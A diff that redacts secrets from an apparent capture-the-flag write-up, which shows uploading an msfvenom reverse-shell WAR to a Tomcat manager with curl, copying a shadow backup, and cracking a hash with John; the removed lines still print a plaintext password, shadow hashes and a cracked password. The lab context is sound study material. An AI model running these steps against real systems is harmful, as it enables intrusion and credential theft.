@@ -68,7 +68,7 @@ https://github.com/00theway/Ghostcat-CNVD-2020-10487
 -- Your project scope is written in the contract.
 3. Developer access is granted with the credentials provided below:
  
-    webdev:Hgj3LA$02D$Fa@21
+    webdev:REDACTED
  
 GUI access is disabled for security reasons.
  
@@ -78,11 +78,6 @@ GUI access is disabled for security reasons.
 
 </web-app>
 
-
-===================
-    webdev:Hgj3LA$02D$Fa@21
-===================
-
 MAYBE THESE ARE THE HTTP AUTHENTICATION CREDS
 
 NOW USING THESE CREDS WE CAN UPLOAD OUR REVERSE SHELL PAYLOAD WHICH WE CAN GENERATE USING MSFVENOM AS IT SHOULD BE A .WAR FILE
@@ -90,7 +85,7 @@ THEN USING CURL WE CAN UPLOAD YOUR REVERSE SHELL AND THEN DEPLOY IT TO GET OUT R
 
 UPLOADING THE PAYLOAD:
 =============================
-# curl --upload-file shell.war -u webdev:'Hgj3LA$02D$Fa@21' "http://10.10.100.161:8080/manager/text/deploy?path=/debug&update=true" 
+# curl --upload-file shell.war -u webdev:'REDACTED' "http://10.10.100.161:8080/manager/text/deploy?path=/debug&update=true" 
 OK - Deployed application at context path [/debug]
                                                                                                                                            
 # curl http://10.10.100.161:8080/debug  
@@ -111,10 +106,10 @@ FOUND A BACKUP OWNED BY ROOT BUT READ BY US IN /var/backups DIRECTORY:
 AFTER COPYING THE FILE TO OUR SERVER:
 ┌──(root💀kali)-[~/vulnNet]
 └─# cat shadow-backup-alt                                                                                                            
-root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
+root:REDACTED
 --[snip]--
-jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
-web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
+jdk-admin:REDACTED
+web:REDACTED
 
 
 WE GOT THE HASHES
@@ -127,7 +122,7 @@ Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA5
 Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-794613852        (jdk-admin)
+REDACTED        (jdk-admin)
 1g 0:00:03:02 0.55% (ETA: 16:31:45) 0.005482g/s 518.6p/s 662.4c/s 662.4C/s 122471..09101988
 Use the "--show" option to display all of the cracked passwords reliably
 Session aborted
